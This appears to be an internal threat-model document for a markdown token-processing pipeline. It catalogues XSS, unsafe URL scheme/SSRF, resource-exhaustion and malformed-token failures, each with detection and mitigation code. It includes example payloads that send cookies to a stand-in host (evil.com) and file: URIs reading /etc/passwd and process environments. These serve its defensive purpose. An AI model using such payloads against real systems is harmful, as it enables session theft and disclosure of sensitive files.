# Phase 8 Attack Scenarios and Mitigations

**Version**: 1.0
**Date**: 2025-10-15
**Status**: Production security analysis
**Scope**: Concrete, realistic attack/failure modes for Phase 8 Token Warehouse

---

## Overview

This document catalogs **realistic attack and failure modes** that can break the Phase 8 warehouse and collectors. Each entry includes:

- **What happens**: Technical description of the failure
- **How triggered**: Attack vector or accident scenario
- **Impact**: Security/availability/correctness consequences
- **Detection**: How to observe it in CI or production
- **Fix**: Immediate mitigation (copy/paste ready)

---

## Security Domain — Ways This Can Be Broken

### Attack 1: Unsafe HTML → XSS at Render Time

**What happens**:
`HtmlCollector` returns raw HTML tokens. A downstream renderer that directly inserts that HTML into a page executes attacker JavaScript.

**How triggered**:
Malicious markdown containing:
- `<script>alert(1)</script>`
- `<img onerror="fetch('//evil.com?c='+document.cookie)">`
- SVG payloads with embedded scripts
- Event handlers (`onload`, `onerror`, `onmouseover`)

**Impact**:
- ✗ **XSS** (Cross-Site Scripting)
- ✗ **Session theft** (cookie exfiltration)
- ✗ **CSRF** of admin UI
- ✗ **Supply-chain compromise** (if previews used in CI/CD)

**Detection**:
```python
# Tests that render sample HTML should fail
assert "<script>" not in rendered_output

# Telemetry shows html items in many inputs
if len(html_items) > 0:
    log_security_event("html_content_detected", count=len(html_items))

# Browser security alerts on previews
# Check for Content-Security-Policy violations in logs
```

**Fix (Immediate)**:
```python
# In HtmlCollector.finalize()
def finalize(self, wh: TokenWarehouse):
    """Return HTML metadata only unless explicitly allowed."""
    if not globals().get('ALLOW_RAW_HTML', False):
        # Safe mode: return only metadata
        return {
            "kind": "html_present",
            "count": len(self._items),
            "warning": "Raw HTML detected - not returned (set ALLOW_RAW_HTML=True to enable)"
        }

    # Unsafe mode: return raw HTML with warning
    return {
        "items": self._items,
        "count": len(self._items),
        "warning": "RAW HTML - renderers MUST sanitize with Bleach/DOMPurify before rendering"
    }
```

**Documentation Update**:
```markdown
## HTML Security Policy

**Default**: Raw HTML is NOT returned. Only metadata is provided.

**Opt-in**: Set `ALLOW_RAW_HTML=True` to receive raw HTML.

**Renderer Responsibility**: If raw HTML is enabled, renderers **MUST** sanitize with:
- Python: `bleach.clean(html, tags=SAFE_TAGS, attributes=SAFE_ATTRS)`
- JavaScript: `DOMPurify.sanitize(html)`

**Never** insert raw HTML directly into DOM without sanitization.
```

---

### Attack 2: Unsafe URL Schemes → SSRF / Local File Exposure

**What happens**:
Collectors pass `href`/`src` along; a resolver or server-side fetcher follows `file:`, `data:`, or `javascript:` URIs.

**How triggered**:
User includes malicious URLs:
- `file:///etc/passwd` (local file disclosure)
- `file:///proc/self/environ` (environment variable exposure)
- `data:text/html,<script>alert(1)</script>` (embedded XSS payload)
- `javascript:void(fetch('//evil.com?'+document.cookie))` (JS execution)
- `ftp://internal-server/` (internal network scanning)

**Impact**:
- ✗ **SSRF** (Server-Side Request Forgery)
- ✗ **Data exfiltration** (local files sent to attacker)
- ✗ **Local file disclosure** (read sensitive files)
- ✗ **Remote invocation** (trigger internal APIs)
- ✗ **Network scanning** (probe internal infrastructure)

**Detection**:
```python
# Telemetry: non-http(s)/mailto schemes appear
from collections import Counter
scheme_counts = Counter()
for link in links:
    scheme = urlsplit(link["url"]).scheme or "relative"
    scheme_counts[scheme] += 1

if any(s not in ("http", "https", "mailto", "relative", "") for s in scheme_counts):
    log_security_event("unsafe_schemes_detected", schemes=scheme_counts)

# Server fetch logs show unexpected schemes
# Grep logs for: "fetching URL:" | grep -v "https://"
```

**Fix (Immediate)**:
```python
from urllib.parse import urlsplit

ALLOWED_SCHEMES = {"http", "https", "mailto", "tel"}

def _allowed(url: str) -> bool:
    """Check if URL scheme is in allowlist.

    Blocks:
    - file:, data:, javascript:, ftp:, gopher:
    - Protocol-relative URLs (//evil.com)

    Allows:
    - http(s), mailto, tel
    - Relative URLs (no scheme)
    """
    url = url.strip()

    # Block protocol-relative URLs
    if url.startswith('//'):
        return False

    # No scheme = relative URL (OK)
    if ":" not in url:
        return True

    try:
        parsed = urlsplit(url)
    except Exception:
        return False  # Fail closed on parse errors

    # Empty scheme = relative URL (OK)
    if not parsed.scheme:
        return True

    # Check against allowlist
    return parsed.scheme.lower() in ALLOWED_SCHEMES

# In LinksCollector/ImagesCollector
link_data = {
    "url": href,
    "allowed": _allowed(href),
    "scheme": urlsplit(href).scheme or "relative",
    # ...
}

# Never resolve non-allowed URLs server-side
if not link["allowed"]:
    # Drop it or mark it but never fetch
    log_security_event("blocked_unsafe_url", url=href, scheme=link["scheme"])
```

**Server-Side Fetcher Guard**:
```python
def fetch_url(url: str) -> bytes:
    """Safe URL fetcher with scheme validation."""
    if not _allowed(url):
        raise SecurityError(f"Unsafe URL scheme: {url}")

    # Additional safeguards
    parsed = urlparse(url)

    # Block private IP ranges (if applicable)
    if is_private_ip(parsed.hostname):
        raise SecurityError(f"Private IP not allowed: {parsed.hostname}")

    # Proceed with fetch
    return requests.get(url, timeout=5).content
```

---

### Attack 3: Malicious Token Getters / Slow attrGet (Resource or Logic Attack)

**What happens**:
`token.attrGet()` is called in hot loop; a malicious/buggy token object implements a slow or throwing `attrGet` which blocks or raises.

**How triggered**:
- Third-party plugin provides custom token class
- Deserialized token object from untrusted source
- `attrGet()` performs heavy computation (DB query, network call)
- `attrGet()` raises custom exceptions

**Impact**:
- ✗ **CPU spike** (slow attrGet called thousands of times)
- ✗ **Latency** (parsing time balloons)
- ✗ **Partial failure** (some collectors abort)
- ✗ **Collector exception** (unhandled error)

**Detection**:
```python
# Spikes in per-token latency
import time
start = time.perf_counter()
for i, tok in enumerate(tokens):
    # ... dispatch ...
    if time.perf_counter() - start > 5.0:
        log_warning("slow_dispatch", token_index=i, elapsed=time.perf_counter()-start)
        break

# _collector_errors non-empty with RuntimeError/custom error names
if wh._collector_errors:
    for collector_name, token_idx, error_type in wh._collector_errors:
        log_error("collector_error", collector=collector_name, token=token_idx, error=error_type)
```

**Fix (Immediate)**:
```python
# Option 1: Wrap attrGet in try/except
def safe_attrGet(token, name, default=""):
    """Safe wrapper for token.attrGet()."""
    try:
        return token.attrGet(name)
    except Exception as e:
        log_warning("attrGet_failed", name=name, error=type(e).__name__)
        # Fallback to direct attribute access
        return getattr(token, name, default)

# In LinksCollector
href = safe_attrGet(token, "href", "")

# Option 2: Normalize attributes during _build_indices (safer)
# Avoid calling attrGet in hot path; cache attributes upfront
def _normalize_token_attrs(self, token):
    """Extract and cache attributes during index build."""
    attrs = {}
    for attr in ("href", "src", "alt", "title"):
        try:
            attrs[attr] = token.attrGet(attr) if hasattr(token, 'attrGet') else getattr(token, attr, None)
        except Exception:
            attrs[attr] = None
    return attrs

# During _build_indices
self._token_attrs = [self._normalize_token_attrs(tok) for tok in tokens]

# In collector (hot path)
href = self._token_attrs[idx].get("href", "")  # O(1), no exceptions
```

---

## Runtime Domain — Ways This Can Be Broken

### Failure 1: Resource Exhaustion by Huge Token Counts (DoS)

**What happens**:
Attacker or accident sends a very large document that tokenizes into millions of tokens; collectors accumulate lots of data → OOM / GC thrash.

**How triggered**:
- Huge file upload (100MB+ markdown)
- Concatenation of many docs
- Crafted markdown with many small tokens (e.g., `a\n` repeated 10M times)
- Decompression bomb (small gzip → huge markdown)

**Impact**:
- ✗ **Process OOM** (out of memory)
- ✗ **Severe latency** (GC thrashing)
- ✗ **Service unavailable** (process killed by OOM killer)
- ✗ **Denial of service** (CPU/memory exhaustion)

**Detection**:
```python
import tracemalloc

# Telemetry: len(tokens) high
if len(tokens) > 100_000:
    log_warning("large_token_count", count=len(tokens))

# Memory spike
tracemalloc.start()
# ... parsing ...
current, peak = tracemalloc.get_traced_memory()
tracemalloc.stop()
if peak > 500 * 1024 * 1024:  # 500MB
    log_error("memory_spike", peak_mb=peak / 1024 / 1024)

# Parsing time skyrockets
if parse_duration_ms > 10_000:  # 10 seconds
    log_error("slow_parse", duration_ms=parse_duration_ms, token_count=len(tokens))
```

**Fix (Immediate)**:
```python
# Enforce hard caps BEFORE tokenization
MAX_BYTES = 10 * 1024 * 1024  # 10MB
MAX_TOKENS = 500_000

def parse_markdown(content: str):
    """Parse markdown with resource guards."""
    # Check byte size
    if len(content.encode('utf-8')) > MAX_BYTES:
        raise DocumentTooLarge(f"Document exceeds {MAX_BYTES} bytes")

    # Tokenize
    tokens = md.parse(content)

    # Check token count
    if len(tokens) > MAX_TOKENS:
        raise DocumentTooLarge(f"Document exceeds {MAX_TOKENS} tokens")

    # Proceed with warehouse
    wh = TokenWarehouse(tokens, tree, text=content)
    return wh

# Per-collector caps (already in security patches)
MAX_LINKS_PER_DOC = 10_000

class LinksCollector:
    def on_token(self, idx, token, ctx, wh):
        # ... existing logic ...
        if len(self._links) >= MAX_LINKS_PER_DOC:
            self._truncated = True
            return  # Stop accumulating
```

**Configuration**:
```python
# Allow configuration per security profile
RESOURCE_LIMITS = {
    "strict": {"max_bytes": 100_000, "max_tokens": 50_000},
    "moderate": {"max_bytes": 10_000_000, "max_tokens": 500_000},
    "permissive": {"max_bytes": 50_000_000, "max_tokens": 2_000_000},
}
```

---

### Failure 2: Broken / Malicious Map Values → Incorrect Sections / Index Corruption

**What happens**:
Tokens have negative, inverted, or wildly out-of-order `map` ranges; section builder produces overlapping or nonsensical sections; `section_of()` returns wrong `section_id`.

**How triggered**:
- Buggy plugin that sets `map = (-100, -50)`
- Malformed token stream with `map = (1000, 0)` (inverted)
- Malicious token injection with `map = (2**31, 2**31)` (huge values)
- Out-of-order heading tokens

**Impact**:
- ✗ **Collectors attach incorrect section IDs** (content mislabeled)
- ✗ **IR is corrupted** (document structure invalid)
- ✗ **Downstream behavioral bugs** (wrong content retrieved)
- ✗ **Social engineering** (content assigned to wrong headings, misleading users)

**Detection**:
```python
# Invariant tests should fail
def test_sections_invariants():
    """Verify sections are sorted and non-overlapping."""
    sections = wh.sections_list()
    for i in range(len(sections) - 1):
        curr = sections[i]
        next = sections[i + 1]

        # Check sorted by start line
        assert curr[1] <= next[1], f"Sections not sorted: {curr} > {next}"

        # Check non-overlapping
        assert curr[2] <= next[1], f"Overlapping sections: {curr} overlaps {next}"

# Runtime alerts when section_of() returns None unexpectedly
section_id = wh.section_of(line)
if section_id is None and line > 0:
    log_warning("section_lookup_failed", line=line, max_line=wh.line_count)
```

**Fix (Immediate)**:
```python
# In TokenWarehouse._build_indices()
MAX_LINE_NUMBER = 1_000_000

def _normalize_map(self, token):
    """Normalize and clamp token.map to safe values."""
    m_raw = getattr(token, 'map', None)

    if not m_raw or not isinstance(m_raw, (list, tuple)) or len(m_raw) != 2:
        return None

    # Parse with fallbacks
    try:
        s = int(m_raw[0]) if m_raw[0] is not None else 0
    except Exception:
        s = 0

    try:
        e = int(m_raw[1]) if m_raw[1] is not None else s
    except Exception:
        e = s

    # Clamp to reasonable bounds
    s = max(0, min(s, MAX_LINE_NUMBER))
    e = max(s, min(e, MAX_LINE_NUMBER))  # Ensure e >= s

    return (s, e)

# During _build_indices
for i, tok in enumerate(tokens):
    normalized_map = self._normalize_map(tok)
    if normalized_map:
        try:
            tok.map = normalized_map  # Overwrite with safe values
        except Exception:
            pass  # Token might be immutable, skip

# Sort heading indices by normalized start (CRITICAL)
heads = self.by_type.get("heading_open", [])
heads = sorted(heads, key=lambda h: (getattr(self.tokens[h], 'map', (0,0))[0] or 0))

# Section builder now operates on normalized, sorted data
```

---

### Failure 3: Collector Exceptions Abort Dispatch (Partial State)

**What happens**:
A collector raises in `on_token`; if dispatcher isn't protected, whole dispatch stops and you get partial results or crash.

**How triggered**:
- Bug in collector logic (e.g., `KeyError`, `AttributeError`)
- Collector encounters malformed token (e.g., missing expected attribute)
- Division by zero, index out of bounds
- Third-party collector with unhandled edge case

**Impact**:
- ✗ **Incomplete parsing** (only some collectors finish)
- ✗ **Parity failures** (output differs from baseline)
- ✗ **Inconsistent pipeline state** (some data present, some missing)
- ✗ **Silent data loss** (collectors that didn't run lose data)

**Detection**:
```python
# Exceptions in logs referencing collector name and token index
# Example log: "Collector 'links' failed at token 1234: KeyError('href')"

# Unit tests that fail intermittently
def test_malformed_token_handling():
    """Verify collectors handle malformed tokens gracefully."""
    malformed_tokens = [
        Tok("link_open", 1, '', None, None, None),  # Missing href
        Tok("heading_open", 1, '', (None, None)),   # Null map
        Tok("image", 0, '', None, None, None),       # Missing src
    ]

    wh = TokenWarehouse(malformed_tokens, None)
    col = LinksCollector()
    wh.register_collector(col)

    # Should not crash
    wh.dispatch_all()

    # Check for logged errors
    assert len(wh._collector_errors) > 0, "Expected collector errors for malformed tokens"
```

**Fix (Immediate)**:
```python
# In TokenWarehouse.dispatch_all()
def dispatch_all(self) -> None:
    """Dispatch tokens to collectors with error isolation."""
    self._collector_errors = []  # Track errors
    RAISE_ON_COLLECTOR_ERROR = globals().get('RAISE_ON_COLLECTOR_ERROR', False)

    tokens = self.tokens
    cols = self._collectors
    ctx = DispatchContext()

    for i, tok in enumerate(tokens):
        # ... existing nesting/filter logic ...

        for col in cols:
            # ... existing interest check ...

            try:
                col.on_token(i, tok, ctx, self)
            except Exception as e:
                # Record error with context
                try:
                    collector_name = getattr(col, 'name', repr(col))
                    error_type = type(e).__name__
                    self._collector_errors.append((collector_name, i, error_type))
                except Exception:
                    # Ultra-defensive: even error logging failed
                    self._collector_errors.append(("unknown", i, "unknown"))

                # Re-raise in test/dev mode for debugging
                if RAISE_ON_COLLECTOR_ERROR:
                    raise

                # Production: log and continue with next collector
                # This ensures all other collectors still run

# Usage
# Test mode (strict):
RAISE_ON_COLLECTOR_ERROR = True
wh.dispatch_all()  # Will raise on first collector error

# Production mode (fault-tolerant):
RAISE_ON_COLLECTOR_ERROR = False
wh.dispatch_all()  # Logs errors but completes dispatch
if wh._collector_errors:
    log_error("collector_errors_occurred", errors=wh._collector_errors)
```

---

## Detection & Monitoring

### CI/CD Gates (Golden Tests)

**Parity Tests**:
```bash
# Existing baseline tests (must pass)
pytest tests/test_token_warehouse.py -v
# Expected: 6/6 passing

# Adversarial tests (malformed maps, unsafe schemes)
pytest tests/test_token_warehouse_adversarial.py -v
# Expected: 2/2 passing (with patches applied)

# Vulnerability tests (all 7 critical vulnerabilities)
pytest tests/test_vulnerabilities_extended.py -v
# Expected: 10+ tests, no crashes
```

**Fault Injection**:
```python
# Test with RAISE_ON_COLLECTOR_ERROR=True
def test_collector_error_handling():
    """Verify collector errors are caught and logged."""
    global RAISE_ON_COLLECTOR_ERROR

    # Production mode
    RAISE_ON_COLLECTOR_ERROR = False
    wh.dispatch_all()
    assert len(wh._collector_errors) == 0, "No errors expected in production mode"

    # Test mode (re-raise)
    RAISE_ON_COLLECTOR_ERROR = True
    with pytest.raises(CollectorError):
        wh.dispatch_all()
```

---

### Runtime Telemetry (Production Monitoring)

**Key Metrics**:
```python
# Parse metrics
metrics = {
    "tokens_per_parse": len(tokens),
    "parse_duration_ms": (end - start) * 1000,
    "peak_rss_mb": peak_memory / 1024 / 1024,

    # Collector metrics
    "collector_error_count": len(wh._collector_errors),
    "collector_errors_by_type": Counter(err[2] for err in wh._collector_errors),

    # Security metrics
    "unsafe_scheme_count": sum(1 for link in links if not link["allowed"]),
    "html_present_count": len(html_items),
    "truncated_collectors": sum(1 for result in results.values() if result.get("truncated")),
}

# Alert thresholds
if metrics["tokens_per_parse"] > 100_000:
    alert("large_document", metrics)

if metrics["collector_error_count"] > 0:
    alert("collector_failures", metrics)

if metrics["unsafe_scheme_count"] > 0:
    alert("unsafe_urls_detected", metrics)
```

**Dashboards**:
- Parse time (p50, p95, p99)
- Memory usage (peak, median)
- Error rate (per collector)
- Scheme distribution (http vs https vs unsafe)
- HTML presence rate

---

### Fuzz Testing (Continuous Validation)

**Generate Adversarial Inputs**:
```python
# Use existing fuzz generator
python tools/generate_adversarial_corpus.py

# Includes:
# - Negative map values: map=(-1000, -999)
# - Inverted maps: map=(100, 50)
# - Huge values: map=(2**30, 2**30+1)
# - Unsafe schemes: javascript:, file:, data:
# - Missing attributes: no href, no src
# - Slow attrGet: custom token class with time.sleep()
```

**Assert Invariants**:
```python
def test_fuzz_adversarial_corpus():
    """Run warehouse on adversarial corpus and check invariants."""
    corpus = load_adversarial_corpus()

    for tokens in corpus:
        wh = TokenWarehouse(tokens, None)
        col = LinksCollector()
        wh.register_collector(col)
        wh.dispatch_all()

        # Invariant 1: Sections sorted and non-overlapping
        sections = wh.sections_list()
        for i in range(len(sections) - 1):
            assert sections[i][2] <= sections[i+1][1], "Overlapping sections"

        # Invariant 2: No crashes
        results = wh.finalize_all()

        # Invariant 3: Collector errors logged but don't crash
        if wh._collector_errors:
            assert RAISE_ON_COLLECTOR_ERROR == False, "Test mode should raise"
```

---

## Quick Prioritized Mitigations (Copy/Paste Checklist)

### Priority 1: Input Validation (Block DoS)
```python
# ✅ Enforce input caps (bytes, tokens) before heavy processing
MAX_BYTES = 10 * 1024 * 1024
MAX_TOKENS = 500_000

if len(content.encode('utf-8')) > MAX_BYTES:
    raise DocumentTooLarge("Exceeds byte limit")
if len(tokens) > MAX_TOKENS:
    raise DocumentTooLarge("Exceeds token limit")
```

### Priority 2: Map Normalization (Fix Correctness)
```python
# ✅ Normalize & clamp token.map during _build_indices
s = max(0, min(int(m[0] or 0), MAX_LINE_NUMBER))
e = max(s, min(int(m[1] or s), MAX_LINE_NUMBER))
tok.map = (s, e)

# ✅ Sort headings by normalized start
heads = sorted(heads, key=lambda h: (tokens[h].map[0] or 0))
```

### Priority 3: URL Security (Prevent SSRF)
```python
# ✅ Enforce scheme allowlist on Links/Images
ALLOWED_SCHEMES = {"http", "https", "mailto", "tel"}

def _allowed(url):
    if url.startswith('//'): return False
    parsed = urlsplit(url)
    return parsed.scheme.lower() in ALLOWED_SCHEMES if parsed.scheme else True

# ✅ Mark unsafe ones rather than silently resolving
link["allowed"] = _allowed(href)
```

### Priority 4: Error Isolation (Prevent Partial Failures)
```python
# ✅ Wrap col.on_token() with try/except
try:
    col.on_token(i, tok, ctx, self)
except Exception as e:
    self._collector_errors.append((col.name, i, type(e).__name__))
    if RAISE_ON_COLLECTOR_ERROR:
        raise
    # Continue with next collector
```

### Priority 5: HTML Safety (Prevent XSS)
```python
# ✅ Treat HTML as data only; default to not returning raw HTML
if not ALLOW_RAW_HTML:
    return {"kind": "html_present", "count": len(items)}

# ✅ Require opt-in and document sanitization requirement
```

### Priority 6: Collector Caps (Bound Memory)
```python
# ✅ Add per-collector caps (max items collected)
MAX_LINKS_PER_DOC = 10_000

if len(self._links) >= MAX_LINKS_PER_DOC:
    self._truncated = True
    return  # Stop accumulating

# ✅ Set _truncated flags in finalize()
return {"links": self._links, "truncated": self._truncated}
```

---

## Implementation Status

### Already Implemented (in `warehouse_phase8_patched/`)
- ✅ Map normalization (Mitigation #2)
- ✅ Collector error capture (Mitigation #4)
- ✅ Integer bounds (Mitigation #2)
- ✅ Reentrancy guard
- ✅ Memory leak fix

### Partially Implemented
- ⚠️ URL scheme validation (in `COMPREHENSIVE_SECURITY_PATCH.md` but not applied)
- ⚠️ Collector caps (in `COMPREHENSIVE_SECURITY_PATCH.md` but not applied)

### Not Yet Implemented
- ❌ Input size caps (Mitigation #1)
- ❌ HTML security policy (Mitigation #5)
- ❌ Safe attrGet wrapper (Mitigation #3)

---

## Testing Matrix

| Attack Scenario | Test File | Status |
|----------------|-----------|--------|
| Unsafe HTML → XSS | `test_vulnerabilities_extended.py` | ⚠️ Partial |
| Unsafe URL schemes | `test_vulnerabilities_extended.py` | ✅ Covered |
| Malicious attrGet | `test_vulnerabilities_extended.py` | ❌ Missing |
| Huge token counts | `test_vulnerabilities_extended.py` | ✅ Covered |
| Broken map values | `test_vulnerabilities_extended.py` | ✅ Covered |
| Collector exceptions | `test_token_warehouse.py` | ⚠️ Partial |

---

## References

### Security Documentation
- `CRITICAL_VULNERABILITIES_ANALYSIS.md` - Deep analysis of 7 vulnerabilities
- `COMPREHENSIVE_SECURITY_PATCH.md` - Production patches
- `PHASE_8_SECURITY_INTEGRATION_GUIDE.md` - Integration guide

### Testing Infrastructure
- `skeleton/tests/test_vulnerabilities_extended.py` (380 lines)
- `skeleton/tools/generate_adversarial_corpus.py` (37 lines)
- `skeleton/tools/run_adversarial.py` (90 lines)

### CI/CD Integration
- `CI_CD_INTEGRATION.md` - Phase 8 gates (P1-P3)
- `../../tools/ci/` - Main project CI gates (G1-G7)

---

**Last Updated**: 2025-10-15
**Status**: Production-ready attack analysis
**Next Step**: Apply remaining mitigations from Priority 1-6 checklist

